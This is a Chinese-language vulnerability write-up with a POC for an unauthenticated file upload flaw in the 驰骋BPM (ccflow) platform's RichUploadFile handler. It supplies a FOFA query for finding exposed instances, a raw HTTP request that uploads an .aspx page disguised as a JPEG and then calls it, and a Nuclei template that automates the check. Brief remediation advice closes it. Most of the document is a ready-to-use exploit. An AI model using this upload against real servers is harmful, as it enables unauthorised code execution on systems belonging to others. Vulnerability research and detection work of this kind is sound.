# 驰骋BPM RichUploadFile 文件上传致RCE漏洞

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 驰骋BPM低代码开发平台 RichUploadFile 文件上传致RCE漏洞 |
| 漏洞类型 | RCE远程命令执行 |
| 组件 | 驰骋BPM (ccflow) |
| 影响版本 | 驰骋BPM低代码开发平台 |

## 漏洞概述

未经身份验证的攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现远程代码执行或服务器控制，影响系统的完整性和安全性。

## 测绘语法

### FOFA
```
body="/WF/AppClassic/Home.htm" || body="ccbpm" || body="/DataUser/Icon/LogBig.png"
```

## 漏洞复现

### POC

**上传请求**
```
POST /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="edit"; filename="rce.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#"%>
<%Response.Write(System.Text.Encoding.GetEncoding("GB2312").GetString(System.Convert.FromBase64String("cmQ1MzNA")));%>
------WebKitFormBoundaryxxx--
```

**访问Shell**
```
GET /DataUser/RichTextFile/Mazi/rce.aspx HTTP/1.1
Host: target
```

### 特征
- 上传路径：`/DataUser/RichTextFile/Mazi/*.aspx`
- 服务：`Microsoft-IIS 10.0`
- 框架：`ASP.NET 4.0.30319`

## Nuclei检测模板

```yaml
id: ccbpm-richuploadfile-rce

info:
  name: CCBPM RichUploadFile File Upload RCE
  author: fortune
  severity: critical
  description: 驰骋BPM低代码开发平台 RichUploadFile 文件上传致RCE漏洞
  reference:
    - https://mp.weixin.qq.com/s/Sa8KabtriYYo2OI7gJe6qA
  tags: ccbpm,ccflow,fileupload,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
    body: |
      ------WebKitFormBoundary{{randstr}}
      Content-Disposition: form-data; name="edit"; filename="test_{{randstr}}.aspx"
      Content-Type: image/jpeg

      <%@ Page Language="C#"%>
      <%Response.Write("{{randstr}}");%>
      ------WebKitFormBoundary{{randstr}}--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '\.aspx$'
          - 'DataUser'
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
